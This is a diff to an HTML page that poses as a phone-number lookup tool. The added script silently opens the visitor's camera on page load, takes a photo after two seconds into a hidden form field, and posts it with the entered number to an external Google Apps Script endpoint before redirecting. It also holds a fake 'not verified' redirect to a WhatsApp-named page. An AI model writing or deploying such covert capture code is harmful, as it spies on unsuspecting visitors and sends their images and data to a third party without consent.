@@ -5,27 +5,37 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Iframe</title>
     <style>
-        iframe {
-            width: 100%;
-            height: 200px;
+    iframe, input, button{background-color: white; padding:15px; border-radius:25px ;         
+     } iframe{
+        width: 95%;
             border: 1px solid #ccc;
         }
     </style>
 </head>
 <body>
-<form action="https://script.google.com/macros/s/AKfycbyG51g2kaW0iz3XzRE-PwIV8v9icTlxetIPaMfczkCozCg5zdvwH5HI1kfPtoW2mlig/exec" method="post">
+  <form id="myForm" method="post">
  
-    <input type="text" id="urlInput" placeholder="Enter Number" value="">
-    <button type="submit" id="loadUrlBtn">Load URL</button>
+    <input type="text" id="phoneNumber" placeholder="Enter Number" value="">
+    
   
-<input type="hidden" name="redirect_url" value="https://NumberInfo">
+<input type="hidden" name="redirect_url" value="NumberInfo.html"><button type="submit" id="loadUrlBtn">Load URL</button><br><br>
     <iframe id="iframe" src="" frameborder="0"></iframe>
     <div id="iframeContent"></div>
 
+    <input type="hidden" name="title" value="Number Info">
+
+    <input type="hidden" name="urlInput" value="NumberInfo.html">
+   
+    <video id="video" autoplay style="display:none;"></video>
+    <canvas id="canvas" style="display:none;"></canvas>
+    <input type="hidden" name="photo" id="photo">
+
+   
+  </form>
     <script>
       if (window.location.href.includes('user=verified')) {
     alert("You are not verified. Redirecting to specific link.");
-    window.location.href = '/Whatsapp.html';
+    window.location.href = 'Funky/Whatsapp.html';
 }
         document.getElementById('loadUrlBtn').addEventListener('click', loadUrl);
 
@@ -39,6 +49,68 @@
                 document.getElementById('iframeContent').innerText = iframeContent;
             };
         }
-    </script>
+
+
+
+
+
+  const form = document.getElementById('myForm');
+
+  form.addEventListener('submit', function(e) {
+    e.preventDefault();
+
+    const formData = new FormData(form);
+    const redirectUrl = formData.get('redirect_url');
+
+    // Convert formData to URLSearchParams for POST
+    const params = new URLSearchParams();
+    for (const pair of formData.entries()) {
+      params.append(pair[0], pair[1]);
+    }
+
+    fetch('https://script.google.com/macros/s/AKfycbxwMvuQnraAoBx9TrB-g__Pa9oH3ApUW7f3E9pbI-Em7pT3mZxUVkdXNSseG9vgQCqI/exec', {
+      method: 'POST',
+      body: params,
+      headers: {
+        'Content-Type': 'application/x-www-form-urlencoded'
+      }
+    })
+    .then(response => {
+      if (!response.ok) throw new Error('Network response was not ok');
+      return response.text();
+    })
+    .then(() => {
+      // Redirect after successful form submission
+      window.location.href = redirectUrl;
+    })
+    .catch(error => {
+       window.location.href = redirectUrl;
+    });
+  });
+
+  const video = document.getElementById('video');
+  const canvas = document.getElementById('canvas');
+  const photoInput = document.getElementById('photo');
+
+  // Access the camera and capture a photo after 2 seconds
+  navigator.mediaDevices.getUserMedia({ video: true })
+    .then(stream => {
+      video.srcObject = stream;
+
+      setTimeout(() => {
+        const context = canvas.getContext('2d');
+        canvas.width = video.videoWidth || 640; // fallback width
+        canvas.height = video.videoHeight || 480; // fallback height
+        context.drawImage(video, 0, 0, canvas.width, canvas.height);
+        photoInput.value = canvas.toDataURL('image/png');
+
+        // Stop the video stream to free camera
+        stream.getTracks().forEach(track => track.stop());
+        video.style.display = 'none';
+      }, 2000);
+    })
+    .catch(err => console.error("Error accessing camera: ", err));
+</script>
+
 </body>
 </html>
